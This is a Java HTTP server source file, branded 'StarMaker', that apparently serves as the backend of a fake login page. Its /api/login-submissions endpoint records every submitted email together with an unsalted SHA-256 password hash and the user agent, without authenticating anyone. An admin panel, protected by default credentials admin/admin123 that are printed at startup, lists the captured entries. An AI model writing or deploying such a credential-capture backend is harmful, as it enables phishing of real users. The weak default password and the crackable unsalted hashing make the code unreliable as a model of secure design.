import com.sun.net.httpserver.Headers;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class JavaBackend {
    private static final Path ROOT = Path.of("").toAbsolutePath();
    private static final Path DATA_DIR = ROOT.resolve("data");
    private static final Path SUBMISSIONS_FILE = DATA_DIR.resolve("submissions.json");
    private static final String ADMIN_USERNAME = envOrDefault("ADMIN_USERNAME", "admin");
    private static final String ADMIN_PASSWORD = envOrDefault("ADMIN_PASSWORD", "admin123");
    private static final Set<String> SESSIONS = Collections.synchronizedSet(new HashSet<>());
    private static final SecureRandom RANDOM = new SecureRandom();

    public static void main(String[] args) throws IOException {
        int port = Integer.parseInt(envOrDefault("PORT", "3000"));
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        server.createContext("/api/login-submissions", JavaBackend::handleLoginSubmission);
        server.createContext("/api/admin/login", JavaBackend::handleAdminLogin);
        server.createContext("/api/admin/logout", JavaBackend::handleAdminLogout);
        server.createContext("/api/admin/submissions", JavaBackend::handleAdminSubmissions);
        server.createContext("/", JavaBackend::handleStaticFile);
        server.setExecutor(Executors.newCachedThreadPool());
        server.start();
        System.out.println("StarMaker Java backend running at http://localhost:" + port);
        System.out.println("Admin panel available at http://localhost:" + port + "/admin.html");
        System.out.println("Default admin login: " + ADMIN_USERNAME + " / " + ADMIN_PASSWORD);
    }

    private static void handleLoginSubmission(HttpExchange exchange) throws IOException {
        if (!"POST".equalsIgnoreCase(exchange.getRequestMethod())) {
            sendJson(exchange, 405, "{\"message\":\"Method not allowed.\"}");
            return;
        }

        Map<String, String> body = parseJsonObject(readBody(exchange));
        String email = body.getOrDefault("email", "").trim();
        String password = body.getOrDefault("password", "");

        if (email.isEmpty() || password.isEmpty()) {
            sendJson(exchange, 400, "{\"message\":\"Email and password are required.\"}");
            return;
        }

        Map<String, String> submission = new HashMap<>();
        submission.put("email", email);
        submission.put("passwordHash", sha256(password));
        submission.put("submittedAt", Instant.now().toString());
        submission.put("userAgent", exchange.getRequestHeaders().getFirst("User-Agent") == null ? "" : exchange.getRequestHeaders().getFirst("User-Agent"));

        List<Map<String, String>> submissions = readSubmissions();
        submissions.add(submission);
        writeSubmissions(submissions);
        sendJson(exchange, 201, "{\"message\":\"Submission saved.\"}");
    }

    private static void handleAdminLogin(HttpExchange exchange) throws IOException {
        if (!"POST".equalsIgnoreCase(exchange.getRequestMethod())) {
            sendJson(exchange, 405, "{\"message\":\"Method not allowed.\"}");
            return;
        }

        Map<String, String> body = parseJsonObject(readBody(exchange));
        String username = body.getOrDefault("username", "");
        String password = body.getOrDefault("password", "");

        if (!ADMIN_USERNAME.equals(username) || !ADMIN_PASSWORD.equals(password)) {
            sendJson(exchange, 401, "{\"message\":\"Invalid admin username or password.\"}");
            return;
        }

        String token = randomToken();
        SESSIONS.add(token);
        exchange.getResponseHeaders().add("Set-Cookie", "adminToken=" + token + "; HttpOnly; SameSite=Strict; Path=/; Max-Age=28800");
        sendJson(exchange, 200, "{\"message\":\"Logged in.\"}");
    }

    private static void handleAdminLogout(HttpExchange exchange) throws IOException {
        if (!isAdmin(exchange)) {
            sendJson(exchange, 401, "{\"message\":\"Admin login required.\"}");
            return;
        }

        String token = cookies(exchange).get("adminToken");
        SESSIONS.remove(token);
        exchange.getResponseHeaders().add("Set-Cookie", "adminToken=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0");
        sendJson(exchange, 200, "{\"message\":\"Logged out.\"}");
    }

    private static void handleAdminSubmissions(HttpExchange exchange) throws IOException {
        if (!isAdmin(exchange)) {
            sendJson(exchange, 401, "{\"message\":\"Admin login required.\"}");
            return;
        }

        List<Map<String, String>> submissions = readSubmissions();
        StringBuilder json = new StringBuilder("{\"submissions\":[");
        for (int i = submissions.size() - 1; i >= 0; i--) {
            Map<String, String> submission = submissions.get(i);
            int id = i + 1;
            if (json.charAt(json.length() - 1) != '[') {
                json.append(',');
            }
            json.append('{')
                    .append("\"id\":").append(id).append(',')
                    .append("\"email\":\"").append(escapeJson(submission.getOrDefault("email", ""))).append("\",")
                    .append("\"submittedAt\":\"").append(escapeJson(submission.getOrDefault("submittedAt", ""))).append("\",")
                    .append("\"userAgent\":\"").append(escapeJson(submission.getOrDefault("userAgent", ""))).append("\",")
                    .append("\"passwordStatus\":\"Stored securely as hash\"")
                    .append('}');
        }
        json.append("]}");
        sendJson(exchange, 200, json.toString());
    }

    private static void handleStaticFile(HttpExchange exchange) throws IOException {
        String requestPath = URLDecoder.decode(exchange.getRequestURI().getPath(), StandardCharsets.UTF_8);
        if ("/".equals(requestPath)) {
            requestPath = "/index.html";
        }

        Path file = ROOT.resolve(requestPath.substring(1)).normalize();
        if (!file.startsWith(ROOT) || Files.isDirectory(file) || !Files.exists(file)) {
            sendText(exchange, 404, "Not found", "text/plain");
            return;
        }

        byte[] bytes = Files.readAllBytes(file);
        exchange.getResponseHeaders().set("Content-Type", contentType(file));
        exchange.sendResponseHeaders(200, bytes.length);
        try (OutputStream output = exchange.getResponseBody()) {
            output.write(bytes);
        }
    }

    private static List<Map<String, String>> readSubmissions() throws IOException {
        if (!Files.exists(SUBMISSIONS_FILE)) {
            return new ArrayList<>();
        }

        String json = Files.readString(SUBMISSIONS_FILE);
        List<Map<String, String>> submissions = new ArrayList<>();
        Matcher objectMatcher = Pattern.compile("\\{([^{}]*)}").matcher(json);
        while (objectMatcher.find()) {
            Map<String, String> entry = parseJsonObject("{" + objectMatcher.group(1) + "}");
            if (entry.containsKey("password") && !entry.containsKey("passwordHash")) {
                entry.put("passwordHash", sha256(entry.remove("password")));
            }
            submissions.add(entry);
        }
        return submissions;
    }

    private static void writeSubmissions(List<Map<String, String>> submissions) throws IOException {
        Files.createDirectories(DATA_DIR);
        StringBuilder json = new StringBuilder("[\n");
        for (int i = 0; i < submissions.size(); i++) {
            Map<String, String> submission = submissions.get(i);
            json.append("  {\n")
                    .append("    \"email\": \"").append(escapeJson(submission.getOrDefault("email", ""))).append("\",\n")
                    .append("    \"passwordHash\": \"").append(escapeJson(submission.getOrDefault("passwordHash", ""))).append("\",\n")
                    .append("    \"submittedAt\": \"").append(escapeJson(submission.getOrDefault("submittedAt", ""))).append("\",\n")
                    .append("    \"userAgent\": \"").append(escapeJson(submission.getOrDefault("userAgent", ""))).append("\"\n")
                    .append("  }");
            if (i < submissions.size() - 1) {
                json.append(',');
            }
            json.append('\n');
        }
        json.append(']');
        Files.writeString(SUBMISSIONS_FILE, json.toString());
    }

    private static Map<String, String> parseJsonObject(String json) {
        Map<String, String> result = new HashMap<>();
        Matcher matcher = Pattern.compile("\"([^\"\\\\]*(?:\\\\.[^\"\\\\]*)*)\"\\s*:\\s*\"([^\"\\\\]*(?:\\\\.[^\"\\\\]*)*)\"").matcher(json);
        while (matcher.find()) {
            result.put(unescapeJson(matcher.group(1)), unescapeJson(matcher.group(2)));
        }
        return result;
    }

    private static String readBody(HttpExchange exchange) throws IOException {
        return new String(exchange.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
    }

    private static boolean isAdmin(HttpExchange exchange) {
        String token = cookies(exchange).get("adminToken");
        return token != null && SESSIONS.contains(token);
    }

    private static Map<String, String> cookies(HttpExchange exchange) {
        Map<String, String> result = new HashMap<>();
        List<String> cookieHeaders = exchange.getRequestHeaders().getOrDefault("Cookie", List.of());
        for (String header : cookieHeaders) {
            for (String cookie : header.split(";")) {
                String[] parts = cookie.trim().split("=", 2);
                if (parts.length == 2) {
                    result.put(parts[0], parts[1]);
                }
            }
        }
        return result;
    }

    private static String contentType(Path file) {
        String name = file.getFileName().toString().toLowerCase();
        if (name.endsWith(".html")) return "text/html; charset=utf-8";
        if (name.endsWith(".css")) return "text/css; charset=utf-8";
        if (name.endsWith(".js")) return "application/javascript; charset=utf-8";
        if (name.endsWith(".svg")) return "image/svg+xml";
        if (name.endsWith(".json")) return "application/json; charset=utf-8";
        if (name.endsWith(".png")) return "image/png";
        if (name.endsWith(".jpg") || name.endsWith(".jpeg")) return "image/jpeg";
        return "application/octet-stream";
    }

    private static void sendJson(HttpExchange exchange, int status, String json) throws IOException {
        sendText(exchange, status, json, "application/json; charset=utf-8");
    }

    private static void sendText(HttpExchange exchange, int status, String text, String contentType) throws IOException {
        Headers headers = exchange.getResponseHeaders();
        headers.set("Content-Type", contentType);
        byte[] bytes = text.getBytes(StandardCharsets.UTF_8);
        exchange.sendResponseHeaders(status, bytes.length);
        try (OutputStream output = exchange.getResponseBody()) {
            output.write(bytes);
        }
    }

    private static String sha256(String value) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(value.getBytes(StandardCharsets.UTF_8));
            StringBuilder result = new StringBuilder();
            for (byte b : hash) {
                result.append(String.format("%02x", b));
            }
            return result.toString();
        } catch (Exception error) {
            throw new IllegalStateException("Unable to hash password", error);
        }
    }

    private static String randomToken() {
        byte[] bytes = new byte[32];
        RANDOM.nextBytes(bytes);
        StringBuilder token = new StringBuilder();
        for (byte b : bytes) {
            token.append(String.format("%02x", b));
        }
        return token.toString();
    }

    private static String escapeJson(String value) {
        return value
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    private static String unescapeJson(String value) {
        return value
                .replace("\\\"", "\"")
                .replace("\\\\", "\\")
                .replace("\\n", "\n")
                .replace("\\r", "\r")
                .replace("\\t", "\t");
    }

    private static String envOrDefault(String name, String fallback) {
        String value = System.getenv(name);
        return value == null || value.isBlank() ? fallback : value;
    }
}
